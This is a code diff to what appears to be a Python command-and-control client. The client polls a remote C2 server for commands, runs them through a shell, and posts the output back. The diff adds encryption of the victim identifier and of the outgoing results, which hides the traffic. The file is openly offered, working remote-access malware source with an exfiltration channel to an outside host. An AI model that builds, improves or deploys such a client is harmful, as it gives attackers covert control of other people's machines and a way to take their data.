@@ -37,6 +37,8 @@ elif system() == "Linux":
 else:
     client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
 
+encryptedClient = cipher.encrypt(client.encode()).decode()
+
 # Print C2 Client Side Message for avoid complexing in test operation
 print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)
 
@@ -44,9 +46,14 @@ def post_to_server(message, response_path=RESPONSE):
     """function to post data to C2 Server, accept message and response path
 	optional as arguments"""
     try:
+        # Byte encoding message and then encrypt it before POSTING
+        message = cipher.encrypt(message.encode())
+
+        # Post encoded encrypted message to Server via response_path address
         post(f"http://{C2_SERVER}:{PORT}{response_path}",
              data={RESPONSE_KEY:message},
              headers=HEADERS, proxies=PROXY)
+
     except exceptions.RequestException:
         return
 
@@ -56,7 +63,7 @@ while True:
     '''Try an http get requests to the C2 Server and retrieve command;
 	if failed, Keep Trying forever.'''
     try:
-        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADERS, proxies=PROXY)
+        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
 
         # if we got 404 status codes, raise an exception to jump to except block
         if response.status_code == 404:
@@ -133,7 +140,8 @@ while True:
     # Run command using subprocess.run module
     else:
         commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
-        post_to_server(commandOutput.stdout)
+        post_to_server(commandOutput.stdout.decode())
+        # post_to_server(commandOutput.stdout.decode())
 
     print("[+] Command Executed and Result send to C2 Server.")
     print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
